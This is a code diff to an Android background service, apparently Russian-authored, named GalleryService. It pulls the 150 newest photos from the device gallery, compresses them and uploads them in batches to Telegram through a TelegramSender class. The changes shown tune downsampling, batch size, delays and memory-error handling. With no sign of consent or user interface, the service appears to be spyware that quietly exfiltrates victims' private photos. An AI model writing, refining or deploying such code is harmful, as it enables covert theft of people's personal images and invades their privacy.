@@ -28,25 +28,38 @@ public class GalleryService extends Service {
             for (Uri uri : allImages) {
                 try {
                     InputStream is = getContentResolver().openInputStream(uri);
+                    
                     BitmapFactory.Options options = new BitmapFactory.Options();
-                    options.inSampleSize = 2; // Уменьшаем размер для скорости
+                    options.inJustDecodeBounds = true;
+                    BitmapFactory.decodeStream(is, null, options);
+                    if (is != null) is.close();
+                    
+                    int scale = 1;
+                    while (options.outWidth / scale > 800 || options.outHeight / scale > 800) {
+                        scale *= 2;
+                    }
+
+                    is = getContentResolver().openInputStream(uri);
+                    options = new BitmapFactory.Options();
+                    options.inSampleSize = scale;
                     Bitmap bitmap = BitmapFactory.decodeStream(is, null, options);
                     if (is != null) is.close();
 
                     if (bitmap != null) {
                         ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                        bitmap.compress(Bitmap.CompressFormat.JPEG, 45, baos); // Сжимаем
+                        bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos); 
                         batch.add(baos.toByteArray());
                         bitmap.recycle();
 
-                        if (batch.size() == 10) { // Отправляем по 10 штук
+                        if (batch.size() == 9) {
                             new TelegramSender().sendMediaGroup(batch, totalSent);
-                            totalSent += 10;
+                            totalSent += 9;
                             batch.clear();
-                            Thread.sleep(500);
+                            Thread.sleep(1000); // Пауза 1 сек
                         }
                     }
                 } catch (Exception e) { e.printStackTrace(); }
+                catch (OutOfMemoryError e) { System.gc(); }
             }
 
             if (!batch.isEmpty()) {
@@ -61,9 +74,8 @@ public class GalleryService extends Service {
     private List<Uri> getRecentImages() {
         List<Uri> imageUris = new ArrayList<>();
         String[] projection = new String[]{MediaStore.Images.Media._ID};
-        
-        // Сортируем от новых к старым и ограничиваем 400 штуками
-        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 400";
+        // Берем 150 последних фото
+        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 150";
 
         Cursor cursor = getContentResolver().query(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
